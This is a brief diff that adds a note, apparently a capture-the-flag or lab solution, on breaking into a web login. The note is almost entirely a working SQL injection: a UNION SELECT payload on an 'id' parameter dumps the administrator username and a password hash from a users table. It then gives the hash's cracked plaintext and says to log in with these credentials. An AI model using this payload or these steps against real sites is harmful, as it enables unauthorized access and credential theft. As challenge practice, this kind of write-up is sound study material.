@@ -1,0 +1,5 @@
+index.php?id=null union select 1,username,3 from users
+gives the username administrator
+substitute password for username and you get 6537d34fd1c080b5cb7f06dde3a26fe8
+the hash is of bl1nd
+enter these on the login page like a boss
